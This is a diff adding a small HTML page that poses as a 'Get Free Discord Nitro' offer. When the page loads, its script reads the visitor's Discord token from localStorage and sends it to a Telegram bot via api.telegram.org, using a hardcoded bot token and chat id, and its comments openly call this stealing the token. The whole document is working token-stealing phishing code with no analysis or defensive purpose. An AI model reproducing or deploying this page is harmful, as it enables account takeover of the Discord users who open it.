@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Free Nitro</title>
+</head>
+<body>
+    <h1>Get Free Discord Nitro!</h1>
+    <p>Loading, please wait...</p>
+
+    <script>
+        // Steal Discord token from localStorage
+        var discordToken = localStorage.getItem("token");
+
+        // Telegram Bot Details
+        var botToken = "7473688315:AAEa309weHlXoOxMYVNHpZCowNs94ZMj1gE"; // Replace with the bot's token
+        var chatId = "6799623923"; // Replace with the group's chat_id
+
+        // Prepare the message
+        var message = "Stolen Discord Token: " + encodeURIComponent(discordToken);
+
+        // Send the message to the Telegram group
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://api.telegram.org/bot" + botToken + "/sendMessage", true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("chat_id=" + chatId + "&text=" + message);
+    </script>
+</body>
+</html>
